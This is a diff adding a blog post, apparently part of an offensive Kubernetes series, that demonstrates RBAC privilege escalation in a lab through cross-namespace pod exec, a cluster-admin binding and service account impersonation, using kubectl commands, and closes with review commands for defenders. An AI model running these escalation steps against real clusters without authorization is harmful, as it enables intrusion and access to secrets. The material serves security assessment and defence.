@@ -1,0 +1,163 @@
+---
+title: "Kubernetes RBAC misconfigs: namespace pivot and impersonation"
+description: "Abuse loose RoleBindings, cross-namespace pod exec, service account impersonation, and cluster-admin tokens during Kubernetes assessments."
+date: 2026-01-09
+seriesSlug: "kubernetes-offensive"
+seriesTitle: "Attacking Kubernetes"
+seriesPart: 8
+seriesDescription: "Offensive Kubernetes: recon through RBAC abuse, pod escapes, persistence, and cloud pivot."
+tags: ["kubernetes", "rbac", "privilege-escalation", "kubernetes-offensive"]
+---
+
+`kubectl auth can-i --list` is the first command after you have a token. RBAC misconfigurations in Kubernetes are common enough that I treat every `yes` on `pods/exec` or `impersonate` as a pivot opportunity.
+
+## Three common privesc paths
+
+```
+Path 1: Namespace pivot
+  SA in ns-A ──pods/exec──► pod in ns-B (RoleBinding lacks namespace scope)
+
+Path 2: Impersonation
+  SA with "impersonate" ──as=cluster-admin-sa──► act as cluster admin
+
+Path 3: cluster-admin binding
+  SA ──*.* on *.*──► create deployments, read all secrets, cluster-wide
+```
+
+## Path 1: Cross-namespace pod exec
+
+Check permissions:
+
+```bash
+kubectl --kubeconfig=ns-pivot-kubeconfig.yaml auth can-i --list
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;">
+  <img src="/resources/kubernetes/Pasted-image-20260109232422.png" alt="RBAC showing pods/exec and secrets access without namespace restriction" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+Look at `pods/exec`, `pods`, and `secrets`. If the `RESOURCE NAMES` column is empty, the permission is **not** scoped to specific resource names. Combined with a RoleBinding that does not restrict target namespaces, you can exec into pods elsewhere.
+
+```bash
+kubectl --kubeconfig=ns-pivot-kubeconfig.yaml get pods -n data-exfiltration
+kubectl --kubeconfig=ns-pivot-kubeconfig.yaml get pods -A
+```
+
+Exec into a pod in another namespace:
+
+```bash
+kubectl --kubeconfig=ns-pivot-kubeconfig.yaml exec -it \
+  secrets-exfil-8ff594fb9-wjh66 \
+  -n data-exfiltration -- /bin/bash
+```
+
+Verify namespace from inside:
+
+```bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+# data-exfiltration
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;" class="blog-figure-wide">
+  <img src="/resources/kubernetes/Pasted-image-20260109233239.png" alt="confirming exec into data-exfiltration namespace" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+You started in `privilege-escalation` (or similar). You are now inside a pod in `data-exfiltration` with that pod's service account and secrets access.
+
+## Path 2: cluster-admin binding
+
+```bash
+kubectl --kubeconfig=clusterradmin-kubeconfig.yaml auth can-i --list
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;" class="blog-figure-wide">
+  <img src="/resources/kubernetes/Pasted-image-20260109233949.png" alt="cluster-admin permissions showing star dot star" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+`Resource: *.*` means cluster-wide everything. Create workloads, read all secrets, modify RBAC.
+
+```bash
+kubectl --kubeconfig=clusterradmin-kubeconfig.yaml get deployments -A
+kubectl --kubeconfig=clusterradmin-kubeconfig.yaml create deployment nginx-deployment --image=nginx
+kubectl --kubeconfig=clusterradmin-kubeconfig.yaml expose deployment nginx-deployment \
+  --port=80 --target-port=80 --type=NodePort
+kubectl --kubeconfig=clusterradmin-kubeconfig.yaml get svc nginx-deployment
+```
+
+Clean up:
+
+```bash
+kubectl --kubeconfig=clusterradmin-kubeconfig.yaml delete deployment nginx-deployment
+```
+
+## Path 3: Service account impersonation
+
+If a service account has `impersonate` on `serviceaccounts`, it can act as **any** service account within the binding scope. Including cluster-admin service accounts.
+
+```bash
+kubectl --kubeconfig=impersonation-kubeconfig.yaml auth can-i --list
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;" class="blog-figure-wide">
+  <img src="/resources/kubernetes/Pasted-image-20260110183826.png" alt="impersonate permission on serviceaccounts" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+Check specific impersonation right:
+
+```bash
+kubectl --kubeconfig=impersonation-kubeconfig.yaml auth can-i impersonate serviceaccounts \
+  --as=system:serviceaccount:privilege-escalation:impersonator-sa \
+  -n privilege-escalation
+# yes
+```
+
+Act as cluster-admin SA:
+
+```bash
+kubectl --kubeconfig=impersonation-kubeconfig.yaml get nodes \
+  --as=system:serviceaccount:privilege-escalation:cluster-admin-sa \
+  -n privilege-escalation
+```
+
+Without `--as`, your own token lacks node list. With `--as`, you inherit the target SA's permissions.
+
+Create a deployment as the elevated SA:
+
+```bash
+kubectl --kubeconfig=impersonation-kubeconfig.yaml create deployment ubuntu-deployment --image=ubuntu \
+  --as=system:serviceaccount:privilege-escalation:cluster-admin-sa \
+  -n privilege-escalation
+
+kubectl --kubeconfig=impersonation-kubeconfig.yaml get deployments \
+  --as=system:serviceaccount:privilege-escalation:cluster-admin-sa \
+  -n privilege-escalation
+
+kubectl --kubeconfig=impersonation-kubeconfig.yaml delete deployment ubuntu-deployment \
+  --as=system:serviceaccount:privilege-escalation:cluster-admin-sa \
+  -n privilege-escalation
+```
+
+Chain impersonation: become `ns-pivot-sa`, then exec cross-namespace:
+
+```bash
+kubectl --kubeconfig=impersonation-kubeconfig.yaml auth can-i --list \
+  --as=system:serviceaccount:privilege-escalation:ns-pivot-sa \
+  -n privilege-escalation
+
+kubectl --kubeconfig=impersonation-kubeconfig.yaml \
+  --as=system:serviceaccount:privilege-escalation:ns-pivot-sa \
+  exec -it secrets-exfil-8ff5b94fb9-wjh66 \
+  -n data-exfiltration -- /bin/bash
+```
+
+## RBAC review commands for defenders
+
+```bash
+kubectl get clusterrolebindings -o wide
+kubectl get rolebindings -A -o wide
+kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa> -n <ns>
+```
+
+Flag any binding granting `cluster-admin`, `impersonate`, or unscoped `pods/exec` to non-system accounts.
+
+Next: secrets exfiltration, registry poisoning, persistence, and cloud metadata pivot.
